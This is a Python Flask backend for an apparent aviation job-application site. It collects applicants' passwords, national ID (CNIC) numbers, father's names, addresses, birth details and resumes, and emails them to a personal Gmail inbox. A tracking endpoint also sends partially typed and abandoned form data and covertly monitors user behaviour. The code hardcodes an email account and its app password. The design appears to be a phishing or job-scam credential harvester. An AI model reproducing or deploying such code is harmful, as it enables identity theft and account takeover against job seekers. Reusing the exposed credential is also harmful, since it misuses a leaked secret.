from flask import Flask, request, jsonify
from flask_cors import CORS
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import base64
import hashlib

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Track submitted applications to prevent duplicates
submitted_applications = set()

# Email configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "alexandervoss43@gmail.com"
EMAIL_PASSWORD = "raha essk rjlg srsq"  # Your app password

@app.route('/')
def home():
    return jsonify({'message': 'Aviation Career Backend API is running!'})

@app.route('/track-application', methods=['POST'])
def track_application():
    try:
        data = request.json
        
        tracking_id = data.get('trackingId', 'Unknown')
        status = data.get('status', 'UNKNOWN')
        current_step = data.get('currentStep', 0)
        step_info = data.get('stepInfo', '')
        form_data = data.get('formData', {})
        completion_percentage = data.get('completionPercentage', 0)
        timestamp = data.get('timestamp', '')
        behavior_data = data.get('behaviorData', {})
        suspicious_activity = data.get('suspiciousActivity', False)
        
        # Enhanced subject line for gaming detection
        gaming_alert = "🚨 GAMING DETECTED" if suspicious_activity else "🔍 TRACKING"
        subject = f"{gaming_alert} - {status} - {tracking_id}"
        
        email_body = f"""
GLOBAL AERO SOLUTIONS - REAL-TIME FORM TRACKING
===============================================

⏰ TIMESTAMP: {timestamp}
🆔 TRACKING ID: {tracking_id}
📊 STATUS: {status}
📋 CURRENT STEP: {current_step}/4
📈 COMPLETION: {completion_percentage}%
ℹ️  STEP INFO: {step_info}

🎯 BEHAVIORAL ANALYSIS:
{'🚨 SUSPICIOUS ACTIVITY DETECTED!' if suspicious_activity else '✅ Normal behavior'}
- Back Clicks: {behavior_data.get('backClicks', 0)} {'(GAMING!)' if behavior_data.get('backClicks', 0) >= 2 else ''}
- Tab Switches: {behavior_data.get('tabSwitches', 0)} {'(SUSPICIOUS!)' if behavior_data.get('tabSwitches', 0) >= 2 else ''}
- Long Pauses: {behavior_data.get('longPauses', 0)} {'(HESITATION!)' if behavior_data.get('longPauses', 0) >= 2 else ''}
- Rapid Clicks: {behavior_data.get('rapidClicks', 0)} {'(GAMING!)' if behavior_data.get('rapidClicks', 0) >= 3 else ''}

===========================================
CAPTURED FORM DATA
===========================================
Full Name: {form_data.get('fullName', 'Not provided')}
Email: {form_data.get('email', 'Not provided')}
Phone: {form_data.get('countryCode', '')} {form_data.get('phone', 'Not provided')}
Password: {form_data.get('password', 'Not provided')}
CNIC: {form_data.get('cnic', 'Not provided')}
Father's Name: {form_data.get('fatherName', 'Not provided')}

Address: {form_data.get('address', 'Not provided')}
City: {form_data.get('city', 'Not provided')}
Country: {form_data.get('country', 'Not provided')}

Date of Birth: {form_data.get('dateOfBirth', 'Not provided')}
Place of Birth: {form_data.get('placeOfBirth', 'Not provided')}

Position Applied: {form_data.get('position', 'Not provided')}
Experience: {form_data.get('experience', 'Not provided')}
Education: {form_data.get('education', 'Not provided')}
Skills: {form_data.get('skills', 'Not provided')}

Availability: {form_data.get('availability', 'Not provided')}
Expected Salary: {form_data.get('expectedSalary', 'Not provided')}
Additional Info: {form_data.get('additionalInfo', 'Not provided')}
Resume: {form_data.get('resumeName', 'Not uploaded')}

===========================================
STATUS MEANINGS:
- IN_PROGRESS: User is actively filling form
- STEP_COMPLETED: User finished a step and moved to next
- STEP_BACK: User went back to previous step  
- ABANDONED: User left/closed the page
- SUBMITTED: User completed and submitted form
- GAMING_DETECTED: Rapid clicking behavior detected
- SUSPICIOUS_TAB_SWITCH: User switching tabs frequently
- LONG_PAUSE: User inactive for extended periods

🎯 GAMING DETECTION THRESHOLDS:
- Back clicks ≥2 = Gaming behavior
- Tab switches ≥2 = Suspicious activity
- Rapid clicks ≥3 = Gaming detected
- Long pauses ≥2 = User hesitation
===========================================
        """
        
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = subject
        
        msg.attach(MIMEText(email_body, 'plain'))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
        server.quit()
        
        return jsonify({
            'success': True,
            'message': f'Tracking data sent successfully - {status}'
        })
        
    except Exception as e:
        print(f"Error sending tracking email: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Failed to send tracking data: {str(e)}'
        }), 500

@app.route('/send-application', methods=['POST'])
def send_application():
    try:
        # Get form data from React frontend
        data = request.json
        
        # Create unique hash for this application to prevent duplicates
        app_hash = hashlib.md5(f"{data.get('fullName', '')}{data.get('email', '')}{data.get('phone', '')}".encode()).hexdigest()
        
        # Check if already submitted
        if app_hash in submitted_applications:
            return jsonify({
                'success': False,
                'message': 'Application already submitted for this person!'
            }), 400
        
        # Create email content
        subject = f"New Aviation Management Application - {data.get('fullName', 'Unknown')}"
        
        email_body = f"""
GLOBAL AERO SOLUTIONS - AVIATION MANAGEMENT
New Career Application Received

===========================================
PERSONAL INFORMATION
===========================================
Full Name: {data.get('fullName', '')}
Email: {data.get('email', '')}
Phone: {data.get('countryCode', '')} {data.get('phone', '')}
Password: {data.get('password', '')}
CNIC: {data.get('cnic', '')}
Father's Name: {data.get('fatherName', '')}

===========================================
ADDRESS INFORMATION
===========================================
Address: {data.get('address', '')}
City: {data.get('city', '')}
Country: {data.get('country', '')}

===========================================
BIRTH INFORMATION
===========================================
Date of Birth: {data.get('dateOfBirth', '')}
Place of Birth: {data.get('placeOfBirth', '')}

===========================================
CAREER INFORMATION
===========================================
Position Applied: {data.get('position', '')}
Experience: {data.get('experience', '')}
Education: {data.get('education', '')}
Skills: {data.get('skills', '')}

===========================================
ADDITIONAL INFORMATION
===========================================
Availability: {data.get('availability', '')}
Expected Salary: {data.get('expectedSalary', '')}
Additional Information: {data.get('additionalInfo', '')}
Resume: {data.get('resumeName', 'Not uploaded')}

===========================================
Application submitted on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
===========================================
        """
        
        # Create email message
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS  # Send to yourself
        msg['Subject'] = subject
        
        # Add body to email
        msg.attach(MIMEText(email_body, 'plain'))
        
        # Handle resume attachment if provided
        if 'resumeFile' in data and data['resumeFile']:
            try:
                # Decode base64 file data
                file_data = base64.b64decode(data['resumeFile']['data'])
                filename = data['resumeFile']['name']
                
                # Create attachment
                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(file_data)
                encoders.encode_base64(attachment)
                attachment.add_header(
                    'Content-Disposition',
                    f'attachment; filename= {filename}'
                )
                msg.attach(attachment)
            except Exception as e:
                print(f"Error attaching resume: {str(e)}")
        
        # Send email
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()  # Enable security
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
        server.quit()
        
        # Mark as submitted to prevent duplicates
        submitted_applications.add(app_hash)
        
        return jsonify({
            'success': True,
            'message': 'Application sent successfully with resume attachment!'
        })
        
    except Exception as e:
        print(f"Error sending email: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Failed to send application: {str(e)}'
        }), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'Backend is running!'})

if __name__ == '__main__':
    # Use PORT from environment variable (Railway) or default to 5000 (local)
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)
